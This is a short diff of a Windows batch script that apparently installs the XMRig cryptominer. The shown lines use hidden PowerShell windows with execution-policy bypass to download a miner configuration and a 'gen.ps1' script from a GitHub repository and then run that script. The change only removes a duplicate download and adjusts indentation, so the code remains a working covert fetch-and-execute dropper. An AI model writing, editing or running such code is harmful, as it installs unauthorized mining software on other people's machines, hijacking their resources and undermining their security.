@@ -13,8 +13,7 @@ if not exist "%STAGE%\xmrig.exe" C:\Windows\System32\WindowsPowerShell\v1.0\powe
 
 if not exist "%STAGE%\config.json" (
   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/config.json' -OutFile '%STAGE%\config.json' -UseBasicParsing"
-  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/config.json' -OutFile '%STAGE%\config2.json' -UseBasicParsing"
-  if not exist "%STAGE%\gen.ps1" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/gen.ps1' -OutFile '%STAGE%\gen.ps1' -UseBasicParsing"
+   if not exist "%STAGE%\gen.ps1" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/gen.ps1' -OutFile '%STAGE%\gen.ps1' -UseBasicParsing"
   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -File "%STAGE%\gen.ps1"
 )
 
